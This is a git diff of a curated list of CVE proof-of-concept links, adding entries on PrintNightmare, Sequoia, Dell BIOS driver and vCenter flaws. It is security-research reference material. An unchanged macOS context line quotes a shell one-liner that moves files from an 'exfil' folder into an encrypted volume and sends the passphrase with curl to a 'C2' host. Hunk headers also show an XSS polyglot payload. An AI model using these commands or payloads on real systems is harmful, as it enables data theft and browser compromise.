@@ -11,6 +11,7 @@ Some CVEs PoCs repos on github or internet.
 - [SecurityExploits](https://github.com/Semmle/SecurityExploits): This repository contains proof-of-concept exploits developed by the Semmle Security Research Team. We always disclose security vulnerabilities responsibly, so this repository only contains exploits for vulnerabilities which have already been fixed and publicly disclosed.
 - [Penetration_Testing_POC](https://github.com/Mr-xn/Penetration_Testing_POC): About penetration-testing python-script poc getshell csrf xss cms php-getshell domainmod-xss penetration-testing-poc csrf-webshell cobub-razor cve rce sql sql-poc poc-exp bypass oa-getshell cve-cms.
 - [Como registrar uma CVE](https://www.youtube.com/watch?v=G1mCQe8z_pA)
+- [ALPACA Attack](https://alpaca-attack.com/)
 
 ## Linux
 
@@ -43,6 +44,7 @@ Some CVEs PoCs repos on github or internet.
 - Exploiting a Linux kernel vulnerability in the V4L2 subsystem: [CVE-2019-18683](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html)
 - Heap-Based Buffer Overflow in Sudo: [CVE-2021-3156](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
 - [Ubuntu OverlayFS Local Privesc](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/): [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)
+- [A Local Privilege Escalation Vulnerability in Linux’s Filesystem Layer](https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909): [cve-2021-33909-crasher.c](cve-2021-33909-crasher.c) [cve-2021-33910-crasher.c](cve-2021-33910-crasher.c)
 
 ## Solaris
 
@@ -100,6 +102,10 @@ Some CVEs PoCs repos on github or internet.
 - Windows TCP/IP: [CVE-2021-24086](https://www.pwnwiki.org/index.php?title=CVE-2021-24086_Windows_TCP/IP%E6%8B%92%E7%B5%95%E6%9C%8D%E5%8B%99%E6%BC%8F%E6%B4%9E/es), [PoC](https://github.com/0vercl0k/CVE-2021-24086) another write-up: [Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)](https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/#bonus-cve-2021-24074)
 - Relaying Potatoes: Another Unexpected Privilege Escalation Vulnerability in Windows RPC Protocol, [CVE-2020-1113 and CVE-2021-1678](https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/). [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
 - Microsoft Exchange Server Remote Code Execution Vulnerability: [CVE-2021-28482](https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda) [article](https://testbnull.medium.com/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482-e713001d915f)
+- A guest-to-host "Microsoft Hyper-V Remote Code Execution Vulnerability" in vmswitch.sys: [CVE-2021-28476](https://github.com/0vercl0k/CVE-2021-28476)
+- C# and Impacket implementation of PrintNightmare: [CVE-2021-1675 / CVE-2021-34527](https://github.com/cube0x0/CVE-2021-1675).
+- [Summer of SAM](https://isc.sans.edu/forums/diary/Summer+of+SAM+incorrect+permissions+on+Windows+1011+hives/27652/): [CVE-2021-36934](https://isc.sans.edu/forums/diary/Summer+of+SAM+Microsoft+Releases+Guidance+for+CVE202136934/27656/)
+- PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface. This is possible via other protocols as well: [SpoolSample](https://github.com/leechristensen/SpoolSample) [SpoolerScanner](https://github.com/vletoux/SpoolerScanner) 
 
 ## macOS/iOS
 
@@ -127,6 +133,7 @@ Some CVEs PoCs repos on github or internet.
   sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
   ```
 - [Don't Share Your $HOME with Untrusted Guests](https://zerodayengineering.com/blog/dont-share-your-home.html). [PoC](https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day): This proof-of-concept demonstrates a trivial no-bug, by-design virtual machine guest-to-host escape with full arbitrary code execution on the current version of Parallels Desktop for Mac.
+- [Patch Gapping a Safari Type Confusion](https://blog.theori.io/research/webkit-type-confusion/)
 
 ## Android
 
@@ -147,11 +154,9 @@ Some CVEs PoCs repos on github or internet.
 - [Apache Struts Vulnerability POC Code Found on GitHub](https://news.hitb.org/content/apache-struts-vulnerability-poc-code-found-github)
 - [struts-pwn](https://github.com/mazen160/struts-pwn_CVE-2018-11776): An exploit for Apache Struts CVE-2018-11776
 
-## BMC
-
-- HPE iLO4: [CVE-2017-12542](https://github.com/airbus-seclab/ilo4_toolbox/blob/master/README.rst)
-
 ## Hardware
+
+- [fragattack](https://www.fragattacks.com/): This website presents FragAttacks (fragmentation and aggregation attacks) which is a collection of new security vulnerabilities that affect Wi-Fi devices.
 
 ### x86
 
@@ -161,6 +166,8 @@ Some CVEs PoCs repos on github or internet.
 - L1 Terminal Fault: [CVE-2018-3615/CVE-2018-3620/CVE-2018-3646/INTEL-SA-00161](https://software.intel.com/security-software-guidance/software-guidance/l1-terminal-fault)
 - [TPM—Fail](http://tpm.fail/): TPM meets Timing and Lattice Attacks. [TPM-FAIL vulnerabilities impact TPM chips in desktops, laptops, servers](https://www.zdnet.com/article/tpm-fail-vulnerabilities-impact-tpm-chips-in-desktops-laptops-servers/), [github](https://github.com/VernamLab/TPM-Fail).
 - Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws: [CVE-2021-21551](https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/)
+- Reverse Engineering & Exploiting Dell [CVE-2021-21551](https://voidsec.com/reverse-engineering-and-exploiting-dell-cve-2021-21551/#_SEP_TOKEN_PRIVILEGES_Overwrite_Exploit_Code)
+- Know Your Enemy: Exploiting the Dell BIOS Driver Vulnerability to Defend Against It: [CVE-2021-21551](https://www.crowdstrike.com/blog/cve-2021-21551-learning-through-exploitation/)
 
 ### ARM
 
@@ -170,6 +177,10 @@ Some CVEs PoCs repos on github or internet.
 - [i.MX7 M4 Atomic Cache Bug](https://rschaefertech.wordpress.com/2018/02/17/imx7-hardware-bug/)
 - [MikroTik Firewall & NAT Bypass](https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24)
 - Security probe of Qualcomm MSM data services [CVE-2020-11292](https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/) [news](https://www.bleepingcomputer.com/news/security/qualcomm-vulnerability-impacts-nearly-40-percent-of-all-mobile-phones/)
+
+### BMC
+
+- HPE iLO4: [CVE-2017-12542](https://github.com/airbus-seclab/ilo4_toolbox/blob/master/README.rst)
 
 ## VirtualBox
 
@@ -272,6 +283,7 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - Some [PoCs](https://github.com/CCob/PoC) about: CVE-2020-8207 and CVE-2020-8324.
 - [Richsploit](https://github.com/redtimmy/Richsploit): [One tool to exploit all versions of RichFaces ever released](https://www.redtimmy.com/java-hacking/richsploit-one-tool-to-exploit-all-versions-of-richfaces-ever-released/) [CVE-2018-14667](https://github.com/syriusbughunt/CVE-2018-14667)
 - Forget Your Perimeter - RCE in Pulse Connect Secure: [CVE-2020-8218](https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/).
+- [Pulse Connect Secure Samba buffer overflow](https://www.kb.cert.org/vuls/id/667933): [cve- 2021-22908](https://github.com/CERTCC/PoC-Exploits/tree/master/cve-2021-22908)
 - some Starlabs [CVES](https://twitter.com/starlabs_sg/status/1299886166406127617): 
   - [CVE-2020-2674](https://starlabs.sg/advisories/20-2674/)
   - [CVE-2020-2682](https://starlabs.sg/advisories/20-2682/)
@@ -289,6 +301,8 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - [The Anatomy of a Bug Door: Dissecting Two D-Link Router Authentication Bypasses](https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses), CVEs CVE-2020-8863 and CVE-2020-8864. [dsp-w215-hnap](https://github.com/bikerp/dsp-w215-hnap): Tool for reading data from D-Link DSP-W215 Smart Plug 
 - [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
 - [VMware vCenter 6.5u1](https://twitter.com/ptswarm/status/1316016337550938122)
+- The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server: [CVE-2021-21985](https://github.com/alt3kx/CVE-2021-21985_PoC)
+- VMware vCenter Server: [CVE-2021-21985](https://github.com/alt3kx/CVE-2021-21985_PoC)
 - [Unauthenticated Full-Read SSRF in Grafana](https://rhynorater.github.io/CVE-2020-13379-Write-Up): CVE-2020-13379
 - [Cisco Security Manager PoCs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e)
 - UK NCSC’s alert urges orgs to fix MobileIron: [CVE-2020-15505](https://securityaffairs.co/wordpress/111426/uncategorized/mobileiron-cve-2020-15505-alert.html)
@@ -299,6 +313,9 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - [Use-After-Free IE Vulnerability](https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html): CVE-2020-17053
 - Cisco ASA: [CVE-2020-3452](https://github.com/cygenta/CVE-2020-3452)
 - github cli: [CVE-2020-26233](https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/)
+- [ECOSPLOITS](https://github.com/ecos-wtf/ecosploits): Bunch of exploits for eCOS.
+- Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability: [CVE-2021-23017](https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/)
+- F5 BIG-IQ: [CVE-2021-22986](https://github.com/Al1ex/CVE-2021-22986)
 
 ## Additions
 
